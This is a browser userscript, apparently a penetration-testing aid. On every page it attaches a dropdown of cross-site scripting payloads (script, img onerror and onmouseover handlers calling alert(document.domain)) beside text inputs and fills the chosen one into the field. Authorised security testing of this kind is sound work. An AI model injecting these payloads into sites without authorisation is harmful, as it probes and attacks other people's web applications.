// ==UserScript==
// @name         xssMenu
// @namespace    hi
// @version      0.1
// @description  XSS select menu
// @author       voidReq
// @include      *
// ==/UserScript==

var payloads = [" ", "<script>alert(document.domain)</script>","<img src='#' onerror=alert(document.domain) />","<b onmouseover=alert(document.domain)>click me!</b>"];
var select_width = 200;
var select_height = 40;
var allTextInputs = document.getElementsByTagName('input');
var inputs = [];

for (let i = 0; i < allTextInputs.length; i++) {
    if (allTextInputs[i].type == "text") {
        inputs.push(allTextInputs[i]);
    }
}

var allTextAreas = document.getElementsByTagName('textarea');
//allTextAreas[i].value = "deca"
inputs = inputs.concat(allTextAreas)

function x(i, curVal) {
    inputs[i].value = curVal;
}


for (let i = 0; i < inputs.length; i++) {
    console.log(inputs[i])
    if(inputs[i].type=="text"){
        var thisInput = inputs[i];
        var select = document.createElement("select");
        select.id = "mySelect" + i;
        var inputRect = thisInput.getBoundingClientRect();
        var selectX = inputRect.right + 65;
        var selectY = inputRect.top - 10;
        select.style = "position:absolute; top:" + selectY + "px; left:" + selectX + "px; background-color: #7c0999; border-radius: 10px; font-size: 20px; width:" + select_width + "px; height:" + select_height + "px";
        select.style.opacity = "0.9";

        for (let a = 0; a < payloads.length; a++) {
            var option = document.createElement("option");
            option.value = payloads[a];
            option.text = payloads[a];
            select.appendChild(option);
        }
        select.onchange = function () {
            var curVal = select.value;
            x(i, curVal);
        };
        inputs[i].parentNode.appendChild(select);
    }
/*
    else if(inputs[i][0].type=="textarea"){
        var thisText = inputs[i][0];
        var selected = document.createElement("select");
        selected.id = "mySelect" + i;
        var textOffsetY = thisText.offsetHeight;
        console.log(textOffsetY)
        
        //var inputRect = thisInput.getBoundingClientRect();
        //var selectX = inputRect.right + 65;
        //var selectY = inputRect.top - 10;
        
        //selected.style = "position:absolute; top:" + selectY + "px; left:" + selectX + "px; background-color: #7c0999; border-radius: 10px; font-size: 20px; width:" + select_width + "px; height:" + select_height + "px";
        selected.style.opacity = "0.9";

        for (let a = 0; a < payloads.length; a++) {
            var anOption = document.createElement("option");
            anOption.value = payloads[a];
            anOption.text = payloads[a];
            selected.appendChild(option);
        }
        selected.onchange = function () {
            var curVal = selected.value;
            x(i, curVal);
        };
        inputs[i].parentNode.appendChild(selected);
    }

*/
}
